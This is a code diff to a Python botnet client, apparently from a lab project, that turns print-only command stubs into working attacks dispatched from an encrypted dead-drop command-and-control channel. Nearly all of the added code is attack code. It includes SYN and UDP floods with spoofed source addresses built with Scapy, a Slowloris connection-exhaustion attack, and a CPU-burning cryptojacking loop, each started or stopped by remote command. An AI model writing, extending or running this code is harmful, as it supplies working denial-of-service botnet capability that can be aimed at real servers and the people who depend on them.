@@ -393,6 +393,111 @@ def dga_fallback_domains(count: int = 20) -> list[str]:
         domains.append(body + tlds[i % len(tlds)])
     return domains
 
+# ── Attack execution helpers ──────────────────────────────────
+# Each helper runs as a daemon thread. A threading.Event stop
+# signal lets commands be cancelled by a subsequent "stop_all".
+
+def _run_syn_flood(target: str, port: int, duration: int,
+                   stop: threading.Event):
+    """Raw TCP SYN flood via Scapy. Matches bot_agent.c logic."""
+    try:
+        from scapy.all import IP, TCP, send, conf
+        conf.verb = 0
+    except ImportError:
+        print("[COVERT] Scapy not installed — pip3 install scapy"); return
+    print(f"[COVERT] SYN FLOOD -> {target}:{port}  duration={duration}s")
+    end, count = time.time() + duration, 0
+    while time.time() < end and not stop.is_set():
+        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+        pkt = IP(src=src, dst=target) / TCP(
+            sport=random.randint(1024, 65535), dport=port,
+            flags="S", seq=random.randint(0, 2**32-1))
+        send(pkt, verbose=False)
+        count += 1
+    print(f"[COVERT] SYN FLOOD done. Packets: {count}")
+
+def _run_udp_flood(target: str, duration: int, stop: threading.Event):
+    """Raw UDP flood via Scapy — 1 KB payloads to random ports."""
+    try:
+        from scapy.all import IP, UDP, Raw, send, conf
+        conf.verb = 0
+    except ImportError:
+        print("[COVERT] Scapy not installed"); return
+    print(f"[COVERT] UDP FLOOD -> {target}  duration={duration}s")
+    payload = b'\x00' * 1024
+    end, count = time.time() + duration, 0
+    while time.time() < end and not stop.is_set():
+        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+        pkt = IP(src=src, dst=target) / UDP(
+            sport=random.randint(1024, 65535),
+            dport=random.randint(1, 65534)) / Raw(load=payload)
+        send(pkt, verbose=False)
+        count += 1
+    print(f"[COVERT] UDP FLOOD done. Packets: {count}")
+
+def _run_slowloris(target: str, port: int, duration: int,
+                   stop: threading.Event):
+    """Import and call slowloris.py; inline fallback if unavailable."""
+    try:
+        from slowloris import slowloris
+        print(f"[COVERT] SLOWLORIS -> {target}:{port}  duration={duration}s")
+        t = threading.Thread(target=slowloris,
+                             args=(target, port, 150, duration), daemon=True)
+        t.start()
+        end = time.time() + duration
+        while time.time() < end and not stop.is_set():
+            time.sleep(1)
+        return
+    except ImportError:
+        pass
+    # Inline fallback
+    print(f"[COVERT] SLOWLORIS (inline) -> {target}:{port}  duration={duration}s")
+    socks = []
+    for _ in range(100):
+        if stop.is_set(): break
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(4); s.connect((target, port))
+            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {target}\r\n".encode())
+            socks.append(s)
+        except Exception:
+            pass
+    end = time.time() + duration
+    while time.time() < end and not stop.is_set():
+        dead = []
+        for s in socks:
+            try: s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
+            except Exception: dead.append(s)
+        for s in dead: socks.remove(s); s.close()
+        time.sleep(10)
+    for s in socks:
+        try: s.close()
+        except Exception: pass
+    print("[COVERT] SLOWLORIS done.")
+
+def _run_cryptojack(duration: int, cpu: float, stop: threading.Event):
+    """Import CryptojackSimulator; minimal inline fallback."""
+    try:
+        from cryptojack_sim import CryptojackSimulator
+        print(f"[COVERT] CRYPTOJACK  cpu={cpu*100:.0f}%  duration={duration}s")
+        sim = CryptojackSimulator(target_pct=cpu, duration=duration)
+        sim.start()
+        end = time.time() + duration
+        while time.time() < end and not stop.is_set(): time.sleep(1)
+        sim.stop(); return
+    except ImportError:
+        pass
+    import hashlib as _h
+    print(f"[COVERT] CRYPTOJACK (inline)  cpu={cpu*100:.0f}%  duration={duration}s")
+    end, state = time.time() + duration, os.urandom(32)
+    while time.time() < end and not stop.is_set():
+        work_end = time.perf_counter() + cpu * 0.1
+        while time.perf_counter() < work_end:
+            state = _h.sha256(state).digest()
+        time.sleep((1.0 - cpu) * 0.1)
+    print("[COVERT] CRYPTOJACK done.")
+
+
 # ── Main bot loop ─────────────────────────────────────────────
 
 class CovertBot:
@@ -412,6 +517,8 @@ class CovertBot:
         self.failures      = 0
         self.last_cmd_hash = None   # prevent replaying the same command
         self._running      = True
+        self._active       = {}     # cmd_type -> (thread, stop_event)
+        self._active_lock  = threading.Lock()
         print(f"[COVERT] Bot ID: {self.bot_id}")
         print(f"[COVERT] Dead drop: {DEAD_DROP_URL}")
         print(f"[COVERT] AES key derived from shared secret")
@@ -422,6 +529,19 @@ class CovertBot:
 
     def _cmd_hash(self, cmd: dict) -> str:
         return hashlib.sha256(json.dumps(cmd, sort_keys=True).encode()).hexdigest()[:16]
+
+    def _launch(self, cmd_type: str, fn, *args):
+        """Run an attack fn in a daemon thread; cancel any prior instance."""
+        with self._active_lock:
+            if cmd_type in self._active:
+                _, old_stop = self._active.pop(cmd_type)
+                old_stop.set()
+            stop = threading.Event()
+            t = threading.Thread(target=fn, args=(*args, stop),
+                                 daemon=True, name=f"atk-{cmd_type}")
+            t.start()
+            self._active[cmd_type] = (t, stop)
+        print(f"[COVERT] Launched: {cmd_type}")
 
     def _execute(self, cmd: dict):
         """Dispatch a received command to the appropriate module."""
@@ -436,14 +556,39 @@ class CovertBot:
         print(f"[COVERT] EXECUTING: {json.dumps(cmd)}")
 
         if cmd_type == "syn_flood":
-            print(f"[COVERT] -> SYN flood target={cmd.get('target')} duration={cmd.get('duration')}s")
-            print(f"[COVERT] -> (In full lab: spawn bot_agent subprocess for raw socket attack)")
+            target   = cmd.get("target", "192.168.100.20")
+            port     = int(cmd.get("port", 80))
+            duration = int(cmd.get("duration", 30))
+            self._launch("syn_flood", _run_syn_flood, target, port, duration)
 
         elif cmd_type == "udp_flood":
-            print(f"[COVERT] -> UDP flood target={cmd.get('target')} duration={cmd.get('duration')}s")
+            target   = cmd.get("target", "192.168.100.20")
+            duration = int(cmd.get("duration", 30))
+            self._launch("udp_flood", _run_udp_flood, target, duration)
 
         elif cmd_type == "slowloris":
-            print(f"[COVERT] -> Slowloris target={cmd.get('target')}:{cmd.get('port', 80)}")
+            target   = cmd.get("target", "192.168.100.20")
+            port     = int(cmd.get("port", 80))
+            duration = int(cmd.get("duration", 60))
+            self._launch("slowloris", _run_slowloris, target, port, duration)
+
+        elif cmd_type == "cryptojack":
+            duration = int(cmd.get("duration", 120))
+            cpu      = float(cmd.get("cpu", 0.25))
+            self._launch("cryptojack", _run_cryptojack, duration, cpu)
+
+        elif cmd_type == "stop_all":
+            print(f"[COVERT] stop_all — halting active attacks")
+            with self._active_lock:
+                for _, (_, ev) in self._active.items(): ev.set()
+                self._active.clear()
+
+        elif cmd_type == "shutdown":
+            print(f"[COVERT] Shutdown command — stopping bot")
+            with self._active_lock:
+                for _, (_, ev) in self._active.items(): ev.set()
+                self._active.clear()
+            self._running = False
 
         elif cmd_type == "dga_search":
             print(f"[COVERT] -> Initiating DGA C2 search...")
